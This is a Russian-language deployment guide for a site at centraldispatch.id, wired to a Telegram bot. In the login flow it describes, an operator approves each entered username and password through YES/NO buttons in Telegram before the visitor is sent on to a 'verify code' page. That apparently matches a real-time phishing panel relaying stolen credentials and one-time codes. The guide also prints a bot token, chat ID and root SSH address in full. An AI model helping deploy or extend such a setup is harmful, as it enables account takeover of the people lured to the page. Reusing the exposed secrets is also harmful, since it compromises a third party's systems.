# 🚀 Загрузка проекта с Telegram ботом на сервер

## Пошаговая инструкция

### Шаг 1: Закоммитить и запушить изменения

**На локальной машине:**

```bash
# Добавить все новые файлы
git add .

# Закоммитить изменения
git commit -m "Add Telegram bot integration for login approval"

# Запушить на GitHub
git push origin main
```

### Шаг 2: Подключиться к серверу

```bash
ssh centraldispatch
# или
ssh root@72.60.31.149
```

### Шаг 3: Обновить проект на сервере

```bash
# Перейти в директорию проекта
cd /var/www/centraldispatch.id

# Загрузить NVM
source ~/.nvm/nvm.sh

# Получить последние изменения из Git
git pull origin main

# Установить зависимости (если нужно)
npm install

# Пересобрать проект
rm -rf .next
npm run build
```

### Шаг 4: Настроить переменные окружения

**Вариант 1: Через ecosystem.config.js (рекомендуется)**

Файл `ecosystem.config.js` уже обновлен с токенами Telegram. Просто перезапустите PM2:

```bash
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

**Вариант 2: Через .env файл**

```bash
# Создать/отредактировать .env файл
nano .env
```

Добавить:
```env
TELEGRAM_BOT_TOKEN=8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs
TELEGRAM_CHAT_ID=5257327001
```

### Шаг 5: Настроить Telegram Webhook

```bash
curl -X POST "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/setWebhook?url=https://centraldispatch.id/api/telegram/webhook"
```

Ожидаемый ответ:
```json
{"ok":true,"result":true,"description":"Webhook was set"}
```

### Шаг 6: Проверить Webhook

```bash
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getWebhookInfo"
```

Должен вернуть:
```json
{
  "ok": true,
  "result": {
    "url": "https://centraldispatch.id/api/telegram/webhook",
    "has_custom_certificate": false,
    "pending_update_count": 0
  }
}
```

### Шаг 7: Перезапустить приложение

```bash
# Перезапустить с обновленными переменными окружения
pm2 restart centraldispatch-nextjs --update-env

# Сохранить конфигурацию PM2
pm2 save

# Проверить статус
pm2 status

# Проверить логи (если нужно)
pm2 logs centraldispatch-nextjs --lines 20
```

### Шаг 8: Проверить работу

1. Откройте https://centraldispatch.id/sign-in
2. Введите username и password
3. Нажмите SIGN IN
4. Должен появиться круговой loading
5. Проверьте Telegram - должно прийти сообщение с кнопками YES/NO
6. Нажмите YES → должен произойти переход на verify code
7. Нажмите NO → должна появиться картинка "error sign in.png"

## 🔧 Быстрая команда (все в одной строке)

```bash
ssh centraldispatch "source ~/.nvm/nvm.sh && cd /var/www/centraldispatch.id && git pull origin main && npm install && rm -rf .next && npm run build && pm2 restart centraldispatch-nextjs --update-env && pm2 save && echo '✅ Обновление завершено!'"
```

## ⚠️ Важно!

1. **Bot Token секретный** - не коммитьте `ecosystem.config.js` с реальными токенами в публичный репозиторий
2. После изменения переменных окружения **обязательно** перезапустите PM2 с флагом `--update-env`
3. Убедитесь, что webhook настроен правильно - без него кнопки YES/NO не будут работать

## 🐛 Устранение неполадок

### Проблема: Сообщения не приходят в Telegram

1. Проверьте, что webhook настроен:
   ```bash
   curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getWebhookInfo"
   ```

2. Проверьте переменные окружения:
   ```bash
   pm2 describe centraldispatch-nextjs | grep TELEGRAM
   ```

3. Проверьте логи:
   ```bash
   pm2 logs centraldispatch-nextjs --err
   ```

### Проблема: Кнопки YES/NO не работают

1. Убедитесь, что webhook endpoint доступен:
   ```bash
   curl https://centraldispatch.id/api/telegram/webhook
   ```

2. Проверьте логи webhook:
   ```bash
   pm2 logs centraldispatch-nextjs | grep "TELEGRAM WEBHOOK"
   ```

### Проблема: Loading не исчезает

1. Проверьте, что endpoint `/api/auth/check-status` работает
2. Проверьте логи в консоли браузера (F12)
3. Проверьте, что polling работает (должны быть запросы к `/api/auth/check-status`)

